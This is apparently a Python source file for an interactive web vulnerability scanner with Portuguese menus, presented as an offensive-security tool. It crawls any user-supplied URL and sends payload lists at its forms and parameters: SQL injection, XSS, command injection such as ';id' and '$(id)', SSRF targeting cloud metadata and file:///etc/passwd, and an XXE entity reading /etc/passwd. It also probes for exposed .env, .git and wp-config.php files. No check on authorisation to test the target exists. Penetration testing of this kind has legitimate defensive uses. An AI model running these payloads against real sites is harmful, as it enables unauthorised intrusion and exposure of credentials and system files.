#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import re
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from time import sleep
import json
import xml.etree.ElementTree as ET

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class AdvancedWebScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9'
        })
        self.vulnerabilities = []
        self.crawled_urls = set()
        self.forms = []
        self.tech_stack = {}

    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def show_banner(self):
        self.clear_screen()
        print(f"""{Colors.RED}
        ██╗    ██╗ █████╗ ██████╗ ██╗████████╗██╗
        ██║    ██║██╔══██╗██╔══██╗██║╚══██╔══╝██║
        ██║ █╗ ██║███████║██████╔╝██║   ██║   ██║
        ██║███╗██║██╔══██║██╔═══╝ ██║   ██║   ██║
        ╚███╔███╔╝██║  ██║██║     ██║   ██║   ██║
         ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   ╚═╝
        {Colors.YELLOW}Advanced Web Scanner - Estilo Drick Framework{Colors.END}
        """)

    def crawl_website(self, base_url, max_depth=2, current_depth=0):
        if current_depth > max_depth:
            return

        try:
            parsed_url = urlparse(base_url)
            base_domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            if base_url in self.crawled_urls:
                return
                
            self.crawled_urls.add(base_url)
            print(f"{Colors.CYAN}[*] Crawling: {base_url}{Colors.END}")
            
            response = self.session.get(base_url, timeout=15)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Detect technology stack
            self.detect_tech_stack(response)
            
            # Extract forms
            for form in soup.find_all('form'):
                form_details = {
                    'action': urljoin(base_url, form.get('action', '')),
                    'method': form.get('method', 'get').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_details = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    form_details['inputs'].append(input_details)
                
                self.forms.append(form_details)
            
            # Extract links and crawl
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(base_url, href)
                
                if not full_url.startswith(base_domain):
                    continue
                    
                if not any(full_url.endswith(ext) for ext in ['.jpg', '.png', '.css', '.js', '.pdf']):
                    self.crawl_website(full_url, max_depth, current_depth + 1)
                    
        except Exception as e:
            print(f"{Colors.RED}[!] Erro ao crawlear {base_url}: {str(e)}{Colors.END}")

    def detect_tech_stack(self, response):
        server = response.headers.get('Server', '').lower()
        powered_by = response.headers.get('X-Powered-By', '').lower()
        
        if 'apache' in server:
            self.tech_stack['web_server'] = 'Apache'
        elif 'nginx' in server:
            self.tech_stack['web_server'] = 'Nginx'
        elif 'iis' in server:
            self.tech_stack['web_server'] = 'Microsoft IIS'
            
        if 'php' in powered_by:
            self.tech_stack['backend'] = 'PHP'
        elif 'asp.net' in powered_by:
            self.tech_stack['backend'] = 'ASP.NET'
        elif 'node.js' in powered_by:
            self.tech_stack['backend'] = 'Node.js'
            
        # Detect by HTML patterns
        if re.search(r'<meta[^>]+content="WordPress', response.text):
            self.tech_stack['cms'] = 'WordPress'
        elif re.search(r'<meta[^>]+content="Joomla', response.text):
            self.tech_stack['cms'] = 'Joomla'
        elif 'drupal' in response.text.lower():
            self.tech_stack['cms'] = 'Drupal'

    def check_sql_injection(self):
        print(f"{Colors.CYAN}[*] Testando SQL Injection em {len(self.forms)} formulários{Colors.END}")
        
        sql_payloads = [
            "'", "\"", "' OR '1'='1", "' OR 1=1--", 
            "') OR ('1'='1", "1 AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--"
        ]
        
        for form in self.forms:
            for payload in sql_payloads:
                data = {}
                for input_field in form['inputs']:
                    if input_field['type'] not in ['submit', 'button']:
                        data[input_field['name']] = payload if input_field['name'] else 'test'
                
                try:
                    if form['method'] == 'GET':
                        response = self.session.get(form['action'], params=data, timeout=10)
                    else:
                        response = self.session.post(form['action'], data=data, timeout=10)
                    
                    error_patterns = [
                        r"SQL syntax.*MySQL", r"Warning.*mysql_.*", 
                        r"Unclosed quotation mark", r"ODBC Driver", 
                        r"Microsoft Access Driver", r"ORA-[0-9]{5}"
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self.vulnerabilities.append({
                                'type': 'SQL Injection',
                                'url': form['action'],
                                'payload': payload,
                                'severity': 'High'
                            })
                            break
                            
                except Exception as e:
                    continue

    def check_xss(self):
        print(f"{Colors.CYAN}[*] Testando XSS em {len(self.forms)} formulários{Colors.END}")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')"
        ]
        
        for form in self.forms:
            for payload in xss_payloads:
                data = {}
                for input_field in form['inputs']:
                    if input_field['type'] not in ['submit', 'button']:
                        data[input_field['name']] = payload if input_field['name'] else 'test'
                
                try:
                    if form['method'] == 'GET':
                        response = self.session.get(form['action'], params=data, timeout=10)
                    else:
                        response = self.session.post(form['action'], data=data, timeout=10)
                    
                    if payload in response.text and 'onerror' not in response.text.lower():
                        self.vulnerabilities.append({
                            'type': 'Cross-Site Scripting (XSS)',
                            'url': form['action'],
                            'payload': payload,
                            'severity': 'Medium'
                        })
                        break
                        
                except Exception as e:
                    continue

    def check_command_injection(self):
        print(f"{Colors.CYAN}[*] Testando Command Injection em {len(self.forms)} formulários{Colors.END}")
        
        cmd_payloads = [
            ";id", "|id", "`id`", "$(id)", 
            "|| ping -c 5 127.0.0.1", 
            "&& dir", "| dir C:\\"
        ]
        
        for form in self.forms:
            for payload in cmd_payloads:
                data = {}
                for input_field in form['inputs']:
                    if input_field['type'] not in ['submit', 'button']:
                        data[input_field['name']] = payload if input_field['name'] else 'test'
                
                try:
                    if form['method'] == 'GET':
                        response = self.session.get(form['action'], params=data, timeout=10)
                    else:
                        response = self.session.post(form['action'], data=data, timeout=10)
                    
                    if "uid=" in response.text or "gid=" in response.text or "Microsoft" in response.text:
                        self.vulnerabilities.append({
                            'type': 'Command Injection',
                            'url': form['action'],
                            'payload': payload,
                            'severity': 'Critical'
                        })
                        break
                        
                except Exception as e:
                    continue

    def check_sensitive_files(self, base_url):
        print(f"{Colors.CYAN}[*] Procurando arquivos sensíveis{Colors.END}")
        
        common_files = [
            "robots.txt", ".git/HEAD", ".env", 
            "wp-config.php", "config.php", 
            "backup.zip", "admin.php", "phpinfo.php",
            "server-status", "web.config", ".htaccess",
            "crossdomain.xml", "clientaccesspolicy.xml"
        ]
        
        for file in common_files:
            test_url = urljoin(base_url, file)
            try:
                response = self.session.get(test_url, timeout=10)
                if response.status_code == 200:
                    if file == ".git/HEAD" and "ref:" in response.text:
                        self.vulnerabilities.append({
                            'type': 'Git Repository Exposed',
                            'url': test_url,
                            'severity': 'High'
                        })
                    elif file == ".env" and "DB_" in response.text:
                        self.vulnerabilities.append({
                            'type': 'Environment File Exposed',
                            'url': test_url,
                            'severity': 'Critical'
                        })
                    else:
                        self.vulnerabilities.append({
                            'type': 'Sensitive File Found',
                            'url': test_url,
                            'severity': 'Medium'
                        })
            except:
                continue

    def check_csrf(self):
        print(f"{Colors.CYAN}[*] Verificando proteção CSRF{Colors.END}")
        
        for form in self.forms:
            has_token = False
            for input_field in form['inputs']:
                if input_field['name'].lower() in ['csrf_token', 'csrfmiddlewaretoken', 'authenticity_token']:
                    has_token = True
                    break
            
            if not has_token and form['method'] == 'POST':
                self.vulnerabilities.append({
                    'type': 'Potential CSRF Vulnerability',
                    'url': form['action'],
                    'severity': 'Medium'
                })

    def check_ssrf(self, base_url):
        print(f"{Colors.CYAN}[*] Testando SSRF em parâmetros de URL{Colors.END}")
        
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "http://localhost:8080"
        ]
        
        parsed_url = urlparse(base_url)
        query_params = {}
        if parsed_url.query:
            for param in parsed_url.query.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    query_params[key] = value
        
        for param in query_params:
            for payload in ssrf_payloads:
                test_url = base_url.replace(f"{param}={query_params[param]}", f"{param}={payload}")
                try:
                    response = self.session.get(test_url, timeout=10)
                    if "root:" in response.text or "AMI ID" in response.text:
                        self.vulnerabilities.append({
                            'type': 'Server-Side Request Forgery (SSRF)',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High'
                        })
                        break
                except:
                    continue

    def check_xxe(self):
        print(f"{Colors.CYAN}[*] Testando XXE em endpoints XML{Colors.END}")
        
        xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>"""
        
        headers = {'Content-Type': 'application/xml'}
        
        for url in self.crawled_urls:
            if any(ext in url.lower() for ext in ['.xml', 'api', 'wsdl', 'soap']):
                try:
                    response = self.session.post(url, data=xxe_payload, headers=headers, timeout=10)
                    if "root:" in response.text:
                        self.vulnerabilities.append({
                            'type': 'XML External Entity (XXE)',
                            'url': url,
                            'severity': 'High'
                        })
                except:
                    continue

    def scan_website(self, url, modules):
        print(f"\n{Colors.YELLOW}[*] Iniciando escaneamento em {url}{Colors.END}")
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        try:
            # Crawl the website first
            self.crawl_website(url)
            
            # Show technology stack
            if self.tech_stack:
                print(f"\n{Colors.BLUE}[*] Tecnologias detectadas:{Colors.END}")
                for tech, value in self.tech_stack.items():
                    print(f"- {tech.capitalize()}: {value}")
            
            # Execute selected modules
            if 'sql' in modules or 'all' in modules:
                self.check_sql_injection()
            
            if 'xss' in modules or 'all' in modules:
                self.check_xss()
            
            if 'files' in modules or 'all' in modules:
                self.check_sensitive_files(url)
            
            if 'cmd' in modules or 'all' in modules:
                self.check_command_injection()
            
            if 'csrf' in modules or 'all' in modules:
                self.check_csrf()
            
            if 'ssrf' in modules or 'all' in modules:
                self.check_ssrf(url)
            
            if 'xxe' in modules or 'all' in modules:
                self.check_xxe()
            
            # Show results
            if self.vulnerabilities:
                print(f"\n{Colors.RED}[!] Vulnerabilidades encontradas:{Colors.END}")
                for vuln in self.vulnerabilities:
                    print(f"\n{Colors.RED}=== {vuln['type']} ==={Colors.END}")
                    print(f"URL: {vuln['url']}")
                    print(f"Severidade: {vuln['severity']}")
                    if 'payload' in vuln:
                        print(f"Payload: {vuln['payload']}")
            else:
                print(f"\n{Colors.GREEN}[+] Nenhuma vulnerabilidade encontrada{Colors.END}")
            
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[!] Erro durante o escaneamento: {e}{Colors.END}")
            return False

    def generate_report(self, filename="report.html"):
        with open(filename, 'w') as f:
            f.write("""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Relatório de Vulnerabilidades</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 20px; }
                    h1 { color: #d9534f; }
                    .vuln { border: 1px solid #ddd; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
                    .critical { background-color: #f2dede; border-left: 5px solid #a94442; }
                    .high { background-color: #fcf8e3; border-left: 5px solid #8a6d3b; }
                    .medium { background-color: #e6f3ff; border-left: 5px solid #337ab7; }
                    .tech { margin-bottom: 30px; }
                    table { width: 100%; border-collapse: collapse; }
                    th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
                </style>
            </head>
            <body>
                <h1>Relatório de Vulnerabilidades</h1>
            """)
            
            if self.tech_stack:
                f.write("<div class='tech'><h2>Tecnologias Detectadas</h2><table>")
                for tech, value in self.tech_stack.items():
                    f.write(f"<tr><th>{tech.capitalize()}</th><td>{value}</td></tr>")
                f.write("</table></div>")
            
            if self.vulnerabilities:
                f.write("<h2>Vulnerabilidades Encontradas</h2>")
                for vuln in self.vulnerabilities:
                    severity_class = vuln['severity'].lower()
                    f.write(f"""
                    <div class="vuln {severity_class}">
                        <h3>{vuln['type']} <small>({vuln['severity']})</small></h3>
                        <p><strong>URL:</strong> {vuln['url']}</p>
                    """)
                    if 'payload' in vuln:
                        f.write(f"<p><strong>Payload:</strong> <code>{vuln['payload']}</code></p>")
                    f.write("</div>")
            else:
                f.write("<p>Nenhuma vulnerabilidade encontrada.</p>")
            
            f.write("</body></html>")
        
        print(f"\n{Colors.GREEN}[+] Relatório gerado como {filename}{Colors.END}")

def main_menu():
    scanner = AdvancedWebScanner()
    
    while True:
        scanner.show_banner()
        print(f"\n{Colors.BOLD}MENU PRINCIPAL:{Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} Escanear URL")
        print(f"{Colors.GREEN}[2]{Colors.END} Escanear com módulos específicos")
        print(f"{Colors.GREEN}[3]{Colors.END} Sobre")
        print(f"{Colors.GREEN}[4]{Colors.END} Sair")
        
        choice = input(f"\n{Colors.BLUE}>>> Escolha uma opção:{Colors.END} ")
        
        if choice == "1":
            url = input(f"\n{Colors.BLUE}>>> Digite a URL alvo (ex: http://example.com):{Colors.END} ")
            scanner.scan_website(url, ['all'])
            scanner.generate_report()
            input(f"\n{Colors.BLUE}>>> Pressione Enter para continuar...{Colors.END}")
        elif choice == "2":
            scanner.show_banner()
            print(f"\n{Colors.BOLD}MÓDULOS DE ESCANEAMENTO:{Colors.END}")
            print(f"{Colors.YELLOW}[!] Selecione os módulos a serem utilizados (separados por vírgula){Colors.END}")
            print(f"\n{Colors.GREEN}[1]{Colors.END} SQL Injection")
            print(f"{Colors.GREEN}[2]{Colors.END} XSS")
            print(f"{Colors.GREEN}[3]{Colors.END} Arquivos sensíveis")
            print(f"{Colors.GREEN}[4]{Colors.END} Command Injection")
            print(f"{Colors.GREEN}[5]{Colors.END} CSRF")
            print(f"{Colors.GREEN}[6]{Colors.END} SSRF")
            print(f"{Colors.GREEN}[7]{Colors.END} XXE")
            print(f"{Colors.GREEN}[8]{Colors.END} Todos os módulos")
            
            modules_choice = input(f"\n{Colors.BLUE}>>> Escolha os módulos:{Colors.END} ")
            
            url = input(f"\n{Colors.BLUE}>>> Digite a URL alvo:{Colors.END} ")
            
            modules_map = {
                '1': 'sql',
                '2': 'xss',
                '3': 'files',
                '4': 'cmd',
                '5': 'csrf',
                '6': 'ssrf',
                '7': 'xxe',
                '8': 'all'
            }
            
            selected_modules = []
            for choice in modules_choice.split(','):
                choice = choice.strip()
                if choice in modules_map:
                    selected_modules.append(modules_map[choice])
            
            if not selected_modules:
                print(f"\n{Colors.RED}[!] Nenhum módulo válido selecionado{Colors.END}")
            else:
                scanner.scan_website(url, selected_modules)
                scanner.generate_report()
            
            input(f"\n{Colors.BLUE}>>> Pressione Enter para continuar...{Colors.END}")
        elif choice == "3":
            scanner.show_banner()
            print(f"\n{Colors.BOLD}SOBRE ESTE PROJETO:{Colors.END}")
            print(f"""
            {Colors.YELLOW}Advanced Web Scanner - Estilo Drick Framework{Colors.END}
            
            Ferramenta avançada de verificação de vulnerabilidades web que implementa
            funcionalidades similares ao Wapiti, incluindo:
            
            - Crawling automático de websites
            - Detecção de tecnologia (CMS, servidor web, backend)
            - Testes de SQL Injection avançados
            - Detecção de XSS persistentes e refletidos
            - Identificação de Command Injection
            - Verificação de proteção CSRF
            - Testes de SSRF e XXE
            - Detecção de arquivos sensíveis expostos
            
            Este scanner é uma implementação puramente em Python com foco em segurança
            ofensiva e testes de penetração web.
            """)
            input(f"\n{Colors.BLUE}>>> Pressione Enter para continuar...{Colors.END}")
        elif choice == "4":
            print(f"\n{Colors.YELLOW}[!] Saindo...{Colors.END}")
            sleep(1)
            sys.exit(0)
        else:
            print(f"\n{Colors.RED}[!] Opção inválida!{Colors.END}")
            sleep(1)

if __name__ == "__main__":
    # Verificar dependências
    try:
        import requests
        import bs4
    except ImportError:
        print(f"\n{Colors.RED}[!] Bibliotecas necessárias não encontradas.{Colors.END}")
        print(f"{Colors.YELLOW}[*] Instale com: pip install requests beautifulsoup4{Colors.END}")
        sys.exit(1)
    
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrompido pelo usuário.{Colors.END}")
        sys.exit(0)